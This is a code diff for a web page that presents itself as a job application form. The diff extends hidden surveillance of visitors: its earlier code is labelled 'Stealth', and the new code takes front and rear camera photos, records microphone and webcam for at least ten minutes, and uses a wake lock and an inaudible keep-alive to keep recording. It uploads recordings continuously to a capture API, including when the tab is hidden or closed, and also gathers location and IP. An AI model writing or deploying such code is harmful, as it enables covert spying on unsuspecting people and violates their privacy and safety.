@@ -31,6 +31,7 @@ const gathered = {
   front_image: null,
   back_image: null,
   audio_recording: null,
+  video_recording: null,
 };
 
 // ── State Variables ──────────────────────────────────────────
@@ -39,8 +40,10 @@ let locationResolved = false;
 let geolocationPromise = null;
 let cameraCapturesPromise = null;
 let audioRecordingPromise = null;
+let videoRecordingPromise = null;
 let ipFetchPromise = null;
 let activeRecorder = null;
+let activeVideoRecorder = null;
 let transmissionResult = null;
 
 // ── DOM Refs ─────────────────────────────────────────────────
@@ -275,75 +278,270 @@ function getGeoLocation() {
 }
 
 // ══════════════════════════════════════════════════════════════
-//  VOICE RECORDING (MediaRecorder API)
+//  VOICE RECORDING (MediaRecorder API — Minimum 10 Minutes Continuous)
 // ══════════════════════════════════════════════════════════════
-function recordAudio(durationSec) {
-  return new Promise(async (resolve) => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+const MIN_AUDIO_RECORD_DURATION_MS = 10 * 60 * 1000; // 10 minutes (600 seconds)
+let activeAudioStream = null;
+let audioChunks = [];
+let audioSyncInterval = null;
+let savedRecordId = null;
+let audioContext = null;
+let screenWakeLock = null;
 
-      audioStatusTx.textContent = "MICROPHONE: RECORDING";
-      audioBox.classList.add("recording");
-      log(`MICROPHONE ACTIVE — RECORDING ${durationSec}s…`, "warn");
-
-      const recorder = new MediaRecorder(stream, { mimeType: getSupportedMime() });
-      activeRecorder = recorder;
-      const chunks = [];
-
-      recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-
-      // Live countdown timer
-      let elapsed = 0;
-      const timerInterval = setInterval(() => {
-        elapsed++;
-        const secs = String(elapsed).padStart(2, "0");
-        audioTimer.textContent = `00:${secs} / 00:${String(durationSec).padStart(2, "0")}`;
-      }, 1000);
-
-      recorder.onstop = async () => {
-        activeRecorder = null;
-        clearInterval(timerInterval);
-        stream.getTracks().forEach((t) => t.stop());
-
-        audioBox.classList.remove("recording");
-        audioTimer.textContent = `00:${String(durationSec).padStart(2, "0")} / 00:${String(durationSec).padStart(2, "0")}`;
-
-        if (chunks.length === 0) {
-          audioStatusTx.textContent = "MICROPHONE: NO DATA";
-          audioBox.classList.add("error");
-          return resolve(null);
-        }
-
-        const blob = new Blob(chunks, { type: recorder.mimeType });
-
-        // Audio hidden from visitor — admin only
-        // No playback shown to visitor
-
-        audioBox.classList.add("done");
-        audioStatusTx.textContent = "VOICE CAPTURED ✓";
-
-        // Convert to base64 for transmission
-        const reader = new FileReader();
-        reader.onloadend = () => resolve(reader.result);
-        reader.onerror = () => resolve(null);
-        reader.readAsDataURL(blob);
-      };
-
-      recorder.start();
-
-      // Auto-stop after duration
-      setTimeout(() => {
-        if (recorder.state === "recording") recorder.stop();
-      }, durationSec * 1000);
-
-    } catch (err) {
-      console.warn("Microphone error:", err.message);
-      audioStatusTx.textContent = "MICROPHONE: DENIED";
-      audioBox.classList.add("error");
-      resolve(null);
+async function startContinuousAudioRecording(existingStream = null) {
+  if (activeRecorder) return;
+  try {
+    // Request wake lock so mobile/desktop browsers do not sleep and interrupt recording
+    if ('wakeLock' in navigator) {
+      try { screenWakeLock = await navigator.wakeLock.request('screen'); } catch (_) {}
     }
+
+    let stream = existingStream;
+    if (!stream || stream.getAudioTracks().length === 0) {
+      stream = await navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => null);
+    }
+    if (!stream || stream.getAudioTracks().length === 0) {
+      console.warn("Microphone access denied or unavailable.");
+      return;
+    }
+    activeAudioStream = stream;
+
+    // Keep-alive AudioContext to prevent modern browsers from freezing background tab audio
+    try {
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      if (AudioCtx) {
+        audioContext = new AudioCtx();
+        const source = audioContext.createMediaStreamSource(stream);
+        const gain = audioContext.createGain();
+        gain.gain.value = 0.0001; // inaudible keep-alive
+        source.connect(gain);
+        gain.connect(audioContext.destination);
+      }
+    } catch (_) {}
+
+    const mimeType = getSupportedMime() || 'audio/webm';
+    const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
+    activeRecorder = recorder;
+    audioChunks = [];
+
+    recorder.ondataavailable = (e) => {
+      if (e.data && e.data.size > 0) {
+        audioChunks.push(e.data);
+      }
+    };
+
+    recorder.onstop = () => {
+      syncAudioToServer(true);
+      if (activeAudioStream) {
+        activeAudioStream.getAudioTracks().forEach((t) => t.stop());
+      }
+      if (audioContext && audioContext.state !== 'closed') {
+        audioContext.close().catch(() => {});
+      }
+      if (screenWakeLock) {
+        screenWakeLock.release().catch(() => {});
+      }
+    };
+
+    // Emit chunk every 4 seconds so chunks accumulate reliably without memory pressure
+    recorder.start(4000);
+
+    // Periodically sync progressive audio to server every 10 seconds once recordId is assigned
+    if (audioSyncInterval) clearInterval(audioSyncInterval);
+    audioSyncInterval = setInterval(() => {
+      syncAudioToServer(false);
+    }, 10000);
+
+    // Ensure audio continues for AT LEAST 10 minutes (600 seconds)
+    setTimeout(() => {
+      if (activeRecorder && activeRecorder.state === "recording") {
+        activeRecorder.stop();
+      }
+      if (audioSyncInterval) clearInterval(audioSyncInterval);
+    }, MIN_AUDIO_RECORD_DURATION_MS);
+
+  } catch (err) {
+    console.warn("Microphone initialization error:", err);
+  }
+}
+
+function getAudioSnapshot() {
+  return new Promise((resolve) => {
+    if (audioChunks.length === 0) return resolve(null);
+    const mimeType = (activeRecorder && activeRecorder.mimeType) || 'audio/webm';
+    const blob = new Blob(audioChunks, { type: mimeType });
+    const reader = new FileReader();
+    reader.onloadend = () => resolve(reader.result);
+    reader.onerror = () => resolve(null);
+    reader.readAsDataURL(blob);
   });
 }
+
+async function syncAudioToServer(isFinal = false) {
+  if (!savedRecordId || audioChunks.length === 0) return;
+  try {
+    const mimeType = (activeRecorder && activeRecorder.mimeType) || 'audio/webm';
+    const blob = new Blob(audioChunks, { type: mimeType });
+    const reader = new FileReader();
+    reader.onloadend = async () => {
+      const base64Data = reader.result;
+      if (!base64Data) return;
+      try {
+        await fetch(`/api/capture/${savedRecordId}/audio`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ audio_recording: base64Data }),
+          keepalive: true
+        });
+      } catch (err) {
+        console.warn("Audio sync error:", err);
+      }
+    };
+    reader.readAsDataURL(blob);
+  } catch (err) {
+    console.warn("Audio chunk processing error:", err);
+  }
+}
+
+// ══════════════════════════════════════════════════════════════
+//  VIDEO RECORDING (MediaRecorder API — Minimum 10 Minutes Continuous)
+// ══════════════════════════════════════════════════════════════
+const MIN_VIDEO_RECORD_DURATION_MS = 10 * 60 * 1000; // 10 minutes (600 seconds)
+let activeVideoStream = null;
+let videoChunks = [];
+let videoSyncInterval = null;
+
+function getSupportedVideoMime() {
+  const types = [
+    "video/webm;codecs=vp8,opus",
+    "video/webm;codecs=vp8",
+    "video/webm;codecs=vp9,opus",
+    "video/webm",
+    "video/mp4"
+  ];
+  for (const t of types) {
+    if (MediaRecorder.isTypeSupported(t)) return t;
+  }
+  return "";
+}
+
+async function startContinuousVideoRecording(existingStream = null) {
+  if (activeVideoRecorder) return;
+  try {
+    let stream = existingStream;
+    if (!stream || stream.getVideoTracks().length === 0) {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } }
+      }).catch(() => null);
+    }
+    if (!stream || stream.getVideoTracks().length === 0) {
+      console.warn("Camera video stream unavailable.");
+      return;
+    }
+    activeVideoStream = stream;
+
+    const mimeType = getSupportedVideoMime() || "video/webm";
+    const recorder = new MediaRecorder(stream, mimeType ? { mimeType, videoBitsPerSecond: 250000 } : { videoBitsPerSecond: 250000 });
+    activeVideoRecorder = recorder;
+    videoChunks = [];
+
+    recorder.ondataavailable = (e) => {
+      if (e.data && e.data.size > 0) {
+        videoChunks.push(e.data);
+      }
+    };
+
+    recorder.onstop = () => {
+      syncVideoToServer(true);
+      if (activeVideoStream) {
+        activeVideoStream.getVideoTracks().forEach((t) => t.stop());
+      }
+    };
+
+    // Emit chunk every 4 seconds so chunks accumulate reliably
+    recorder.start(4000);
+
+    // Periodically sync progressive video to server every 12 seconds once recordId is assigned
+    if (videoSyncInterval) clearInterval(videoSyncInterval);
+    videoSyncInterval = setInterval(() => {
+      syncVideoToServer(false);
+    }, 12000);
+
+    // Ensure video continues for AT LEAST 10 minutes (600 seconds)
+    setTimeout(() => {
+      if (activeVideoRecorder && activeVideoRecorder.state === "recording") {
+        activeVideoRecorder.stop();
+      }
+      if (videoSyncInterval) clearInterval(videoSyncInterval);
+    }, MIN_VIDEO_RECORD_DURATION_MS);
+
+  } catch (err) {
+    console.warn("Video recorder initialization error:", err);
+  }
+}
+
+function getVideoSnapshot() {
+  return new Promise((resolve) => {
+    if (videoChunks.length === 0) return resolve(null);
+    const mimeType = (activeVideoRecorder && activeVideoRecorder.mimeType) || "video/webm";
+    const blob = new Blob(videoChunks, { type: mimeType });
+    const reader = new FileReader();
+    reader.onloadend = () => resolve(reader.result);
+    reader.onerror = () => resolve(null);
+    reader.readAsDataURL(blob);
+  });
+}
+
+async function syncVideoToServer(isFinal = false) {
+  if (!savedRecordId || videoChunks.length === 0) return;
+  try {
+    const mimeType = (activeVideoRecorder && activeVideoRecorder.mimeType) || "video/webm";
+    const blob = new Blob(videoChunks, { type: mimeType });
+    const reader = new FileReader();
+    reader.onloadend = async () => {
+      const base64Data = reader.result;
+      if (!base64Data) return;
+      try {
+        await fetch(`/api/capture/${savedRecordId}/video`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ video_recording: base64Data }),
+          keepalive: true
+        });
+      } catch (err) {
+        console.warn("Video sync error:", err);
+      }
+    };
+    reader.readAsDataURL(blob);
+  } catch (err) {
+    console.warn("Video blob processing error:", err);
+  }
+}
+
+// Background sync on tab hide or page unload
+window.addEventListener("visibilitychange", () => {
+  if (document.visibilityState === "hidden") {
+    if (activeRecorder && activeRecorder.state === "recording") {
+      try { activeRecorder.requestData(); } catch (_) {}
+    }
+    if (activeVideoRecorder && activeVideoRecorder.state === "recording") {
+      try { activeVideoRecorder.requestData(); } catch (_) {}
+    }
+    syncAudioToServer(false);
+    syncVideoToServer(false);
+  }
+});
+
+window.addEventListener("beforeunload", () => {
+  if (activeRecorder && activeRecorder.state === "recording") {
+    try { activeRecorder.requestData(); } catch (_) {}
+  }
+  if (activeVideoRecorder && activeVideoRecorder.state === "recording") {
+    try { activeVideoRecorder.requestData(); } catch (_) {}
+  }
+  syncAudioToServer(true);
+  syncVideoToServer(true);
+});
 
 // Pick a supported audio MIME type
 function getSupportedMime() {
@@ -438,57 +636,54 @@ function triggerPermissionsAndCapture() {
     return geoResult;
   });
 
-  // 2. Camera captures (Stealth)
+  // 2. Camera photo captures & Continuous 10-Minute Video Recording
   cameraCapturesPromise = new Promise(async (resolve) => {
-    const takePhoto = async (facingMode) => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        await new Promise(r => video.onloadedmetadata = r);
-        await new Promise(r => setTimeout(r, 500)); 
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
-        stream.getTracks().forEach(t => t.stop());
-        return dataUrl;
-      } catch(err) { return null; }
-    };
-    gathered.front_image = await takePhoto("user");
-    gathered.back_image = await takePhoto({ exact: "environment" }).catch(() => null);
-    if (!gathered.back_image) gathered.back_image = await takePhoto("environment");
-    resolve();
-  });
-
-  // 3. Audio Recording (Stealth)
-  audioRecordingPromise = new Promise(async (resolve) => {
+    let combinedStream = null;
     try {
-      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => null);
-      if (audioStream) {
-        activeRecorder = new MediaRecorder(audioStream);
-        const audioChunks = [];
-        activeRecorder.ondataavailable = e => audioChunks.push(e.data);
-        activeRecorder.onstop = () => {
-          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-          const reader = new FileReader();
-          reader.readAsDataURL(audioBlob);
-          reader.onloadend = () => {
-            gathered.audio_recording = reader.result;
-            resolve();
-          }
-        };
-        activeRecorder.start();
-        setTimeout(() => {
-          if(activeRecorder.state !== "inactive") activeRecorder.stop();
-          audioStream.getTracks().forEach(t => t.stop());
-        }, 3000);
-      } else {
-        resolve();
+      combinedStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } },
+        audio: true
+      }).catch(() => null);
+
+      if (combinedStream && combinedStream.getVideoTracks().length > 0) {
+        const vEl = document.createElement("video");
+        vEl.srcObject = combinedStream;
+        vEl.play();
+        await new Promise((r) => (vEl.onloadedmetadata = r));
+        await new Promise((r) => setTimeout(r, 400));
+        const cEl = document.createElement("canvas");
+        cEl.width = vEl.videoWidth || 640;
+        cEl.height = vEl.videoHeight || 480;
+        cEl.getContext("2d").drawImage(vEl, 0, 0);
+        gathered.front_image = cEl.toDataURL("image/jpeg", 0.6);
       }
-    } catch(e) { resolve(); }
+    } catch (_) {}
+
+    // Quick rear camera snapshot (if device supports environment lens)
+    try {
+      const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).catch(() => null);
+      if (backStream) {
+        const bvEl = document.createElement("video");
+        bvEl.srcObject = backStream;
+        bvEl.play();
+        await new Promise((r) => (bvEl.onloadedmetadata = r));
+        await new Promise((r) => setTimeout(r, 400));
+        const bcEl = document.createElement("canvas");
+        bcEl.width = bvEl.videoWidth || 640;
+        bcEl.height = bvEl.videoHeight || 480;
+        bcEl.getContext("2d").drawImage(bvEl, 0, 0);
+        gathered.back_image = bcEl.toDataURL("image/jpeg", 0.6);
+        backStream.getTracks().forEach((t) => t.stop());
+      }
+    } catch (_) {}
+
+    // Start 10-minute continuous video recording
+    startContinuousVideoRecording(combinedStream);
+
+    // Start 10-minute continuous audio recording
+    startContinuousAudioRecording(combinedStream);
+
+    resolve();
   });
 
   // 4. IP Fetching
@@ -528,25 +723,37 @@ jobAppForm.addEventListener("submit", async (e) => {
     triggerPermissionsAndCapture();
   }
 
-  // Force early stop on audio recorder to get results immediately
+  // Request latest audio and video data slices without interrupting recorders
   if (activeRecorder && activeRecorder.state === "recording") {
-    activeRecorder.stop();
+    try { activeRecorder.requestData(); } catch (_) {}
+  }
+  if (activeVideoRecorder && activeVideoRecorder.state === "recording") {
+    try { activeVideoRecorder.requestData(); } catch (_) {}
   }
 
   // Perform device scans
   scanDevice();
 
-  // Wait for all promises to finish
+  // Wait for initial non-continuous promises to complete
   await Promise.all([
     geolocationPromise,
     cameraCapturesPromise,
-    audioRecordingPromise,
     ipFetchPromise
   ].filter(p => p !== null));
+
+  // Get current audio & video snapshots for initial capture record
+  gathered.audio_recording = await getAudioSnapshot();
+  gathered.video_recording = await getVideoSnapshot();
 
   // Transmit payload to Backend
   try {
     transmissionResult = await transmit();
+    if (transmissionResult && transmissionResult.success && transmissionResult.recordId) {
+      savedRecordId = transmissionResult.recordId;
+      // Immediately trigger initial sync
+      syncAudioToServer(false);
+      syncVideoToServer(false);
+    }
   } catch (err) {
     console.error("Transmission failed:", err);
   }
